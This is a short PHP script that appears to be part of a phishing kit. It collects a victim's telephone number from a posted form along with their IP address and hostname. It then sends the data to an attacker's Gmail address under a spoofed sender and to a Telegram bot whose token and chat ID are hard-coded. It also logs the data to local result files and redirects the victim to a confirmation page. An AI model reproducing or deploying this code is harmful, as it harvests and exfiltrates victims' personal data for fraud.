<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "------- NUM -------\n";
$message .= "Telephone             : ".$_POST['tel']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "------------------\n";
$send = "Ossmane45@gmail.com";
$subject = "NUM| $ip ";
$headers = "From:Trnswise <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: ./confirmation.php");

?>